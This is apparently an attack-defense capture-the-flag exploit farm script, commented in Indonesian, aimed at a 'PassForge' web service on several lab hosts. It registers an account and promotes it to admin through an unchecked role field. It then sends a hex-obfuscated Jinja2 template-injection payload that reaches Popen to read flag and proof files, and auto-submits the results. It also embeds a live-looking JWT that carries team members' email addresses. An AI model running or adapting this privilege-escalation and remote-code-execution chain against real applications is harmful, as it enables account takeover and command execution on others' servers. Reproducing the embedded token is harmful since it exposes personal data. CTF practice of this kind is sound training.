#!/usr/bin/env python3
import requests
import socket
import sys
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================= KONFIGURASI =================
TARGET_PORT = 8120
SUBMIT_URL = "https://10.0.2.3/api/v2/submit"   # ganti sesuai platform
SUBMIT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZWFtX2lkIjoxMDksInBsYXllcl9pZCI6MTYsInRlYW1fbmFtZSI6IkN1bWkgSGl0YW0gUGFrIEtyaXMiLCJ0ZWFtX2NvbnRhY3RfZW1haWwiOiJhcmlkd2FuaGFraW0xN0BnbWFpbC5jb20iLCJkaXNwbGF5X25hbWUiOiJrb25jb25lIGtpYWkiLCJlbWFpbCI6InJpZHdhbmR1bWJhY2NAZ21haWwuY29tIiwicm9sZSI6Im1lbWJlciIsImlhdCI6MTc4MjEwMjU5NywiZXhwIjoxNzgyMTg4OTk3fQ.dKhuHYQZ1crPnjCBlZxOiFupH5gkueEsrHBuU-7S530"

IP_RANGE = [f"10.80.5.{i}" for i in range(11, 21) if i != 19]  # 11-20 kecuali 19

# ================= HELPER =================
def port_open(host, port, timeout=1):
    """Cek apakah port terbuka (TCP connect)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def register(session, host, username, password):
    url = f"http://{host}:{TARGET_PORT}/api/register"
    payload = {"username": username, "password": password, "email": f"{username}@passforge.local"}
    try:
        r = session.post(url, json=payload, timeout=5)
        if r.status_code != 200:
            return False
        data = r.json()
        return data.get("status") == "ok"
    except:
        return False

def login(session, host, username, password):
    url = f"http://{host}:{TARGET_PORT}/api/login"
    payload = {"username": username, "password": password}
    try:
        r = session.post(url, json=payload, timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get("status") != "ok":
            return None
        return data.get("token")
    except:
        return None

def promote_to_admin(session, host, token):
    url = f"http://{host}:{TARGET_PORT}/api/profile"
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"role": "admin"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=5)
        if r.status_code != 200:
            return False
        data = r.json()
        return data.get("status") == "ok"
    except:
        return False

def exploit_ssti(session, host, token):
    url = f"http://{host}:{TARGET_PORT}/api/admin/smart-import"
    headers = {"Authorization": f"Bearer {token}"}
    # SSTI payload hex‑encoded untuk bypass filter
    template = (
        "{{ ''['\\x5f\\x5fclass\\x5f\\x5f']['\\x5f\\x5fmro\\x5f\\x5f'][1]"
        "['\\x5f\\x5fsubclasses\\x5f\\x5f']()|selectattr('\\x5f\\x5fname\\x5f\\x5f','equalto','Popen')"
        "|first['\\x5f\\x5finit\\x5f\\x5f']['\\x5f\\x5fglobals\\x5f\\x5f']"
        "['\\x70\\x6f\\x70\\x65\\x6e']"
        "('\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\\x20\\x2f\\x70\\x72\\x6f\\x6f\\x66\\x2e\\x74\\x78\\x74').read() }}"
    )
    csv_data = "template\n" + template + "\n"
    try:
        r = session.post(url, data=csv_data, headers=headers, timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get("status") != "ok":
            return None
        results = data.get("results", [])
        if not results:
            return None
        return results[0].get("value")
    except:
        return None

def submit_flag(flag):
    """Submit flag ke platform CTF"""
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {SUBMIT_TOKEN}"
    }
    payload = {"flags": [flag]}
    try:
        r = requests.post(SUBMIT_URL, json=payload, headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            print(f"[*] Submit OK: {r.json()}")
        else:
            print(f"[-] Submit failed: {r.status_code} {r.text}")
    except Exception as e:
        print(f"[-] Submit exception: {e}")

def attack_target(host):
    """Serang satu host, kembalikan (flag, proof)"""
    print(f"[*] Checking {host}:{TARGET_PORT}...")
    if not port_open(host, TARGET_PORT, timeout=1):
        print(f"[-] {host}: Port closed/slow, skip")
        return None, None

    print(f"[+] {host}: Port open, start exploit")
    session = requests.Session()
    session.timeout = 5
    username = f"attacker_{host.replace('.','_')}"
    password = "attacker123"

    if not register(session, host, username, password):
        print(f"[-] {host}: Register failed")
        return None, None

    token = login(session, host, username, password)
    if token is None:
        print(f"[-] {host}: Login failed")
        return None, None

    if not promote_to_admin(session, host, token):
        print(f"[-] {host}: Promote admin failed")
        return None, None

    output = exploit_ssti(session, host, token)
    if output is None:
        print(f"[-] {host}: SSTI exploit failed")
        return None, None

    lines = output.strip().split('\n')
    flag = proof = None
    for line in lines:
        if "PLAYIT{" in line or "FLAG{" in line:
            flag = line.strip()
        if "proof" in line.lower():
            proof = line.strip()

    print(f"[+] {host}: Flag={flag}, Proof={proof}")
    return flag, proof

def main():
    print("[*] Starting PassForge farm...")
    results = []
    flags_found = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(attack_target, host): host for host in IP_RANGE}
        for future in as_completed(futures):
            host = futures[future]
            try:
                flag, proof = future.result(timeout=30)
                if flag:
                    flags_found.append(flag)
                results.append((host, flag, proof))
            except Exception as e:
                print(f"[-] {host}: Exception {e}")

    print("\n" + "="*50)
    print("SUMMARY")
    for host, flag, proof in results:
        print(f"{host}: FLAG={flag}, PROOF={proof}")
    print("="*50)

    # Simpan ke file
    with open("flags_proofs.txt", "w") as f:
        for host, flag, proof in results:
            f.write(f"{host}: {flag} | {proof}\n")
    print("[+] Results saved to flags_proofs.txt")

    # Submit semua flag
    if flags_found:
        print(f"\n[*] Submitting {len(flags_found)} flags...")
        for flag in flags_found:
            if flag:
                submit_flag(flag)
    else:
        print("[-] No flags to submit.")

if __name__ == "__main__":
    main()
